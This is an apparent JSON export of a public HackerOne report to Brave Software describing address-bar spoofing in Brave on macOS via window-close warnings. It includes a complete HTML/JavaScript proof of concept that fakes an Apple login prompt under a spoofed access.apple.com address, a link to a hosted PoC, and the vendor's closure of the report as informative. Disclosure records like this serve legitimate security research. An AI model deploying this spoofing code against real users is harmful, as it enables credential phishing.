{"id":208834,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDg4MzQ=","url":"https://hackerone.com/reports/208834","title":"Address bar spoofing in Brave browser via. window close warnings","state":"Closed","substate":"informative","severity_rating":"medium","readable_substate":"Informative","created_at":"2017-02-25T08:54:01.874Z","submitted_at":"2017-02-25T08:54:01.874Z","is_member_of_team?":false,"reporter":{"disabled":true,"username":"xifengweiyu","url":"/xifengweiyu","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15688,"url":"https://hackerone.com/brave","handle":"brave","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Brave Software","twitter_handle":"brave","website":"https://brave.com","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-08-10T05:09:22.500Z","bug_reporter_agreed_on_going_public_at":"2017-04-29T02:17:48.322Z","team_member_agreed_on_going_public_at":"2017-08-10T05:09:22.461Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\nI would like to Report Address Bar spoofing vulnerability in Brave Browser on macOS.\n\n## Summary:\n\nWhen people visit the poc page,I notice them to type a DNS record exist but cannot access domain \"access.apple.com\" to address bar.then window will popup a close warnings,then phishing is beginning...\n\n\n## Products affected: \n\n**macOS Sierra version:** 10.12.3\n\n**Brave version:**\n\nBrave: 0.13.4 \nrev: 71d8ffc7278a90b22b8617d37880787c1781e694 \nMuon: 2.56.4 \nlibchromiumcontent: 56.0.2924.87 \nV8: 5.6.326.50 \nNode.js: 7.4.0 \nUpdate Channel: dev \nos.platform: darwin \nos.release: 16.4.0 \nos.arch: x64\n\n\n## Steps To Reproduce:\n\n 1.POC script is:\n\n```\n\u003ch1 id=\"msg\"\u003eNext,type access.apple.com in the address bar.\u003c/h1\u003e\n\u003ch1 id=\"spoof\"\u003e\u003c/h1\u003e\n\u003cscript type=\"text/javascript\"\u003e\nspoof.style.display = 'none';\nvar done = 0;\nvar got = 0;\nonbeforeunload = function(ev) {\n  done = 1;\n  return false;\n}\nonmousemove = function() {\n  stop();\n  if (done \u0026\u0026 !got) {\n    msg.style.display = 'none';\n    got = \"1000\";\n    if (got) {\n      document.write(\"\u003ctitle\u003eapple login\u003c/title\u003e\u003ch1\u003eThis is not apple.com!!!\u003c/h1\u003e\u003cscri\"+\"pt\u003eonbeforeunload=function(){/*while(1){}*/};document.write('\u003cinput id=\\\\\\'log\\\\\\'\u003e');window.stop();prompt('enter your apple account...');window.stop();location.assign('https://access.apple.com');\u003c/scrip\"+\"t\u003e\");\n      spoof.style.display = 'block';\n      log.value = got;\n      \n    }\n  }\n}\n\u003c/script\u003e\n```\n\n2. Or you can visit online poc page,then following page instruction:\n\n[https://api.lightrains.org/poc/17.html](https://api.lightrains.org/poc/17.html)\n\nBest regards!\n","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":163618,"file_name":"brave1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/163/618/865ab9df5c25ccb312789126e943c60cb3dc0e57/brave1.png?response-content-disposition=attachment%3B%20filename%3D%22brave1.png%22%3B%20filename%2A%3DUTF-8%27%27brave1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSK4WOTH5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T140330Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDjst9aCdbYiLIMwr9Ch8DTQvtbqAq2PUTmVxrtmvThtAIgSEwpNKIplIEtz5xxnkJ1cS4PAKNsqIRPh%2BdjbNa6kNkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDKoloRrogbt9MrbINirXAweStit7tRbKldWmv5m56905qopCrhiIh0afa7BbXcyddiE1lVP3qkUzFkFARwrvCPxZZcK6znBAwkJeuq4ZLJKAiz3SE6Bbgz0dPuj5RcfBoLhQs58tlPQozqAXbn12Pem3I6YCouzl5yxAPj18pgpKNG9x0obczWpKTFqenMNS%2FDu29u%2FUXKeLdJ2YkbDJ3XC8il3DY%2BsF0AQK%2BTcpJmDkP%2FR6Dwfqj8V5nzSLB1B1Q6QKWpALdT%2FIkMCDfVSozDYYuJ%2B9d368wBuia6V19rrqP4dim%2Fn5rdZQAZGoaXUkXaah9AFHE0FSAuyZ8IZeejx3%2FdcPvRQe2Mtynd1G9IzsNxTMmMeNREOTl067S0zwh4y7t8KilEdNjQSMknLg5rIXLbexXIllu28cawyKmB%2B0EFLEWmIzIHF2qPobRuriHSz5yTIi7gEF8vXtLa4QXkyCv7CLN5Vxr%2FhBcUOJ0mor%2B1EH7PiNAJNHD7L9d3BsThsGtjiy5YJnYdjvpFzOy8Ro05N%2Bwb5lzjttxXZnLYahE5ZQL1WRoFq8GjlpDi49lPqx%2FKlTMF1sdKJQqPZ5DnOj8NpjT2u%2FvGPKmmbRTmrjR%2Btw5ZOX8amRb2qEQ0GO8SLbSeik7jDz8JCLBjqlAcqviimSgTUYofaoYwBX9mq7VXP5cwJTSm6hfLkG0QxpfImbjAzvJqxMzJa1M8izlVHsrcenCg4EcO8k%2BRgMmYj9Fwc9z6RJPYBR%2B1XesfAaFfpOmWU87WZPC%2B3JgE%2BYkn7oq3crPoupd2DALi7dIoYlyYw0rG3eP95a6C3LPyMxHWbXCufcqViLnI3Eh6pXDyFdYoSymtaB29TlNwveUgEvmnpZ0w%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d3412d82c31736073abc236a6fbb70ab049d5096d8370ea03190d0b113ee4777","file_size":194205,"type":"image/png"},{"id":163619,"file_name":"brave2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/163/619/aa7aaeeca85b1894462c5a7ced7ec33bfa7fc76d/brave2.png?response-content-disposition=attachment%3B%20filename%3D%22brave2.png%22%3B%20filename%2A%3DUTF-8%27%27brave2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSK4WOTH5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T140330Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDjst9aCdbYiLIMwr9Ch8DTQvtbqAq2PUTmVxrtmvThtAIgSEwpNKIplIEtz5xxnkJ1cS4PAKNsqIRPh%2BdjbNa6kNkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDKoloRrogbt9MrbINirXAweStit7tRbKldWmv5m56905qopCrhiIh0afa7BbXcyddiE1lVP3qkUzFkFARwrvCPxZZcK6znBAwkJeuq4ZLJKAiz3SE6Bbgz0dPuj5RcfBoLhQs58tlPQozqAXbn12Pem3I6YCouzl5yxAPj18pgpKNG9x0obczWpKTFqenMNS%2FDu29u%2FUXKeLdJ2YkbDJ3XC8il3DY%2BsF0AQK%2BTcpJmDkP%2FR6Dwfqj8V5nzSLB1B1Q6QKWpALdT%2FIkMCDfVSozDYYuJ%2B9d368wBuia6V19rrqP4dim%2Fn5rdZQAZGoaXUkXaah9AFHE0FSAuyZ8IZeejx3%2FdcPvRQe2Mtynd1G9IzsNxTMmMeNREOTl067S0zwh4y7t8KilEdNjQSMknLg5rIXLbexXIllu28cawyKmB%2B0EFLEWmIzIHF2qPobRuriHSz5yTIi7gEF8vXtLa4QXkyCv7CLN5Vxr%2FhBcUOJ0mor%2B1EH7PiNAJNHD7L9d3BsThsGtjiy5YJnYdjvpFzOy8Ro05N%2Bwb5lzjttxXZnLYahE5ZQL1WRoFq8GjlpDi49lPqx%2FKlTMF1sdKJQqPZ5DnOj8NpjT2u%2FvGPKmmbRTmrjR%2Btw5ZOX8amRb2qEQ0GO8SLbSeik7jDz8JCLBjqlAcqviimSgTUYofaoYwBX9mq7VXP5cwJTSm6hfLkG0QxpfImbjAzvJqxMzJa1M8izlVHsrcenCg4EcO8k%2BRgMmYj9Fwc9z6RJPYBR%2B1XesfAaFfpOmWU87WZPC%2B3JgE%2BYkn7oq3crPoupd2DALi7dIoYlyYw0rG3eP95a6C3LPyMxHWbXCufcqViLnI3Eh6pXDyFdYoSymtaB29TlNwveUgEvmnpZ0w%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=75d758dc3aae0b81103c1b4f107d21764e0700e7120b482a98c6f7fe98909ec7","file_size":129360,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":5,"voters":["skansing","khizer47","bharathkumardonbro","chal13w1zz","cometstreamn"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1507033,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for reporting, we'll get back to you shortly.","automated_response":false,"created_at":"2017-02-27T00:23:36.619Z","updated_at":"2017-02-27T00:23:36.619Z","actor":{"username":"asuka","cleared":false,"url":"/asuka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/923/28e02b13f94679bbda8c7d3b7390776d8977f1b6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1516684,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"I am going to close this as informative because the behavior is the same in Chrome, except that we do not yet support window.prompt (see https://github.com/brave/browser-laptop/issues/94). The spoofing part of this is not very convincing because the browser shows the 'loading' icon to indicate that the access.apple.com load has not finished, so the origin in the URL bar is not reliable.","automated_response":false,"created_at":"2017-03-03T00:45:50.626Z","updated_at":"2017-03-03T00:45:50.626Z","actor":{"username":"diracdeltas","cleared":false,"url":"/diracdeltas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/616/4e2016543ea3e299dcadd088be7d0225de3419e0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1516747,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Alright,thank you for your work.","automated_response":false,"created_at":"2017-03-03T02:46:33.839Z","updated_at":"2017-03-03T02:46:33.839Z","actor":{"username":"xifengweiyu","cleared":false,"url":"/xifengweiyu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1643991,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-04-29T02:17:48.342Z","updated_at":"2017-04-29T02:17:48.342Z","first_to_agree":true,"actor":{"username":"xifengweiyu","cleared":false,"url":"/xifengweiyu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1827251,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Could you agree to disclose this report publicly?","automated_response":false,"created_at":"2017-07-12T06:18:31.063Z","updated_at":"2017-07-12T06:18:31.063Z","actor":{"username":"xifengweiyu","cleared":false,"url":"/xifengweiyu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1876082,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Is anyone online?","automated_response":false,"created_at":"2017-07-29T15:17:51.785Z","updated_at":"2017-07-29T15:17:51.785Z","actor":{"username":"xifengweiyu","cleared":false,"url":"/xifengweiyu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1907084,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Anyone here?","automated_response":false,"created_at":"2017-08-05T08:20:38.421Z","updated_at":"2017-08-05T08:20:38.421Z","actor":{"username":"xifengweiyu","cleared":false,"url":"/xifengweiyu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1918399,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Sorry for the delay","automated_response":false,"created_at":"2017-08-10T05:09:22.480Z","updated_at":"2017-08-10T05:09:22.480Z","actor":{"username":"diracdeltas","cleared":false,"url":"/diracdeltas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/616/4e2016543ea3e299dcadd088be7d0225de3419e0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1918400,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-08-10T05:09:22.515Z","updated_at":"2017-08-10T05:09:22.515Z","actor":{"username":"diracdeltas","cleared":false,"url":"/diracdeltas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/616/4e2016543ea3e299dcadd088be7d0225de3419e0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1918812,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks","automated_response":false,"created_at":"2017-08-10T09:52:22.431Z","updated_at":"2017-08-10T09:52:22.431Z","actor":{"username":"xifengweiyu","cleared":false,"url":"/xifengweiyu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}